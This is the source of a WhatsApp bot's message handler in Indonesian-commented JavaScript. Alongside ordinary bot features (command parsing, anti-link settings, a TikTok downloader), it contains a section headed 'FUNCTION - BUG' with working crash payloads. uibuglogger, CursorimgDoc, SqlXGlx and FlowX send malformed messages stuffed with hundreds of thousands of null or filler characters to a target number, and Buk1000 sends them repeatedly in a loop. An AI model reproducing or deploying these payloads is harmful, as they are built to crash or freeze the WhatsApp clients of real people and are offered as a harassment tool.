/*
     *Base : Fallzx
     *Creator : KyyXD
     *Created On : 19/3/25
     *Whatsapp : 6288286624778
     *Chanel Yt : @KyyHost
     
     JANGAN JUAL MEMEK,, RECODE? JANGAN HAPUS CREDITNYA ANJINK 
     CREATED : KYYXD
     CH RESMI : https://whatsapp.com/channel/0029Vb7gTNO5a2450z5MnD0k
*/

//==================================================================\\
//===================[ TEMPAT MODULE ]=====================\\
require("./config")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec, spawn, execSync } = require("childprocess")
const chalk = require('chalk')
const { createCanvas, loadImage, registerFont } = require('canvas')
const sharp = require('sharp')
const moment = require('moment-timezone');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const translate = require('translate-google-api')
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const cheerio = require('cheerio');
const path = require('path')
const { Sticker } = require('wa-sticker-formatter')
const { 
    FajarNews, 
    BBCNews, 
    metroNews, 
    CNNNews, 
    iNews, 
    KumparanNews, 
    TribunNews, 
    DailyNews, 
    DetikNews, 
    OkezoneNews, 
    CNBCNews, 
    KompasNews, 
    SindoNews, 
    TempoNews, 
    IndozoneNews, 
    AntaraNews, 
    RepublikaNews, 
    VivaNews, 
    KontanNews, 
    MerdekaNews, 
    KomikuSearch, 
    AniPlanetSearch, 
    KomikFoxSearch, 
    KomikStationSearch, 
    MangakuSearch, 
    KiryuuSearch, 
    KissMangaSearch, 
    KlikMangaSearch, 
    PalingMurah, 
    LayarKaca21, 
    AminoApps, 
    Mangatoon, 
    WAModsSearch, 
    Emojis, 
    CoronaInfo, 
    JalanTikusMeme, 
    Cerpen, 
    Quotes, 
    Couples, 
    Darkjokes } = require("dhn-api");
    const {
    igdl: igdl,
    youtube: youtube,
    ttdl: ttdl
} = require("btch-downloader");
let globalAutoAIStatus = false;

module.exports = async (Kyyhst, m) => {
try {
const from = m.key.remoteJid
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
//==================================================================\\
//==================================================================\\


//==================================================================\\
// FILE LIB
//==================================================================\\
const { 
smsg, 
fetchJson, 
getBuffer, 
fetchBuffer, 
getGroupAdmins, 
TelegraPh, 
isUrl, 
hitungmundur, 
sleep, 
clockString, 
checkBandwidth, 
runtime, 
tanggal, 
getRandom 
} = require('./lib/myfunc')

const { 
addResponList, 
delResponList,
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/respon-list');

const { 
isSetProses, 
addSetProses, 
removeSetProses, 
changeSetProses, 
getTextSetProses
 } = require('./lib/setproses');

const { 
isSetDone, 
addSetDone, 
removeSetDone, 
changeSetDone, 
getTextSetDone 
} = require('./lib/setdone');

const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')

const prem = require("./lib/premium");
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));

const { 
	addFilter, 
	addSpam, 
	isFiltered, 
	isSpam, 
	ResetSpam 
} = require('./lib/antispam');


//==================================================================\\
//==================================================================\\


//==================================================================\\
// PREFIX, ADMIN, OWNER, BOT
//==================================================================\\
const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Kyyhst.user.id.split(':')[0]+'@s.whatsapp.net' || Kyyhst.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Kyyhst.decodeJid(Kyyhst.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const groupMetadata = m.isGroup ? await Kyyhst.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isRegistered = checkRegisteredUser(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)



//==================================================================\\
// FILE DATABASE
//==================================================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
const ntilinkgc = JSON.parse(fs.readFileSync("./system/Database/Antilink/antilinkgc.json"))
let ntvirtex = JSON.parse(fs.readFileSync('./system/Database/Antilink/antivirus.json'))
let ntasing = JSON.parse(fs.readFileSync('./system/Database/Antilink/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./system/Database/Antilink/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkytvideo.json'))
let ntilinktele =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinktelegram.json'))
let ntilinkdewasa =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkbokep.json'))
let ntilinkterabox =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkterabox.json'))
let ntilinkmediafire =JSON.parse(fs.readFileSync('./system/Database/Antilink/antilinkmediafire.json'))

const AntiLink = m.isGroup ? ntilinkgc.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false
const AntiDewasa = m.isGroup ? ntilinkdewasa.includes(m.chat) : false
const AntiTerabox = m.isGroup ? ntilinkterabox.includes(m.chat) : false
const AntiMediafire = m.isGroup ? ntilinkmediafire.includes(m.chat) : false
const AntiTele = m.isGroup ? ntilinktele.includes(m.chat) : false



//==================================================================\\
// TAMPILAN DI CONSOLE PANEL
//==================================================================\\
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}



//==================================================================\\
// DATABASE NYA
//==================================================================\\
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Kyyhst.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPrem ? 1000 : 30
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
}

let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
		       	  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false 
                
               } else global.db.data.chats[from] = {
                  antibot: false,
                  antiviewonce: false,                  
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antispam: false,                  
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antipromotion: false,
                  antilinkgc: false,                              
               }

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = true
} else global.db.data.settings[botNumber] = {
 autoread: true,
}


//==================================================================\\
// FUNCTION LAINNYA
//==================================================================\\
// GROUP
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Kyyhst.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Kyyhst.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}


// AUTOREAD
if (global.autoread) {
Kyyhst.readMessages([m.key])
        };


// UKURAN PROFILE
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}



// MENAMPILKAN PROFILE USERS
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};




// SELF DAN PUBLIC
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}



// DOWNLOAD FITUR TIKTOK 2
    async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
    }



// MENGAKTIFKAN DEATURE ANTI
    function handleFeatureToggle(feature, command) {
    if (!m.isGroup) return reply(mess.OnlyGrup);
    if (!isBotAdmins) return reply(mess.botAdmin);
    if (!isAdmins && !isCreator) return reply(mess.admin);
    if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');

    if (args[0] === 'on') {
        db.data.chats[from][feature] = true;
        return reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[from][feature] = false;
        return reply(`${command} is disabled`);
    }
    }



// TOTOAL FEATURED
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
  
        

// PICK RANDOM                    
        const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}



// TEXT UNBAN
const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./system/metthod/textunban.js')
const { textunbanpremv1, textunbanpremv2, textunbanpremv3 } = require('./system/metthod/textunbanprem.js')
        
        

//==================================================================\\
// [    F U N C T I O N -   B U G -    K Y Y X D Z            
//==================================================================\\
        async function uibuglogger(target) {
     let sections = [];
     
     let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };
    await Kyyhst.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'c',
                        degreesLongitude: 'c',
                        caption: '𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑?' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "call_permission_request",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "mpm",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "galay_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "DapzNotDev@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
  contextInfo: {
      forwardingScore: 127,
            isForwarded: true,
                    quotedMessage: {
                             documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑 ☠️",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
                    contactVcard: true
                        },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: "𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑🩸"
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
    await console.clear()
    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Bug WhatsApp Ui System`);
}

async function CursorimgDoc(target) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "Haii?" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑' }, 
type: 1, 
nativeFlowInfo: { 
name: '𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "ざ ⿻ᬃ𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐊𝐢𝐥𝐥⃟⃟⿻ だ" + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: Kyyhst.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [target, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "KyyhstInflow",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "ざ ⿻ᬃ𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐊𝐢𝐥𝐥⃟⃟⿻ だ"
},
hasMediaAttachment: true,
contentText: "KyyhstFlows",
footerText: "Apsi Ngentot?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/rayystur",
buttonTitle: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363383643148260@newsletter",
serverMessageId: 1,
newsletterName: `All Info 𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑 ofc 𖣂${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
}
}
}
}
}
};
await Kyyhst.relayMessage(target, messagePayload, {
messageId: Kyyhst.generateMessageTag(), 
participant: { jid : target }
});
}

async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "ꦾ".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "P",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await Kyyhst.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "© 𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐂𝐫𝐚𝐬𝐡𝐞𝐫👀",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑🐉",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Kyyhst.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function Buk1000(target) {
    for (let i = 0; i <= 20; i++) {
    await FlowX(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await CursorimgDoc(target);
    }
}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `© 𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕1`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 
//==================================================================\\
//==================================================================\\



//==================================================================\\
//===================[ FUNCTION REPLY ]=====================\\
 async function makeStickerFromUrl(imageUrl, Kyyhst, m) {
      try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
          const base64Data = imageUrl.split(",")[1];
          buffer = Buffer.from(base64Data, "base64");
        } else {
          const response = await axios.get(imageUrl, {
            responseType: "arraybuffer",
          });
          buffer = Buffer.from(response.data, "binary");
        }

        const webpBuffer = await sharp(buffer)
          .resize(512, 512, {
            fit: "contain",
            background: { r: 255, g: 255, b: 255, alpha: 0 },
          })
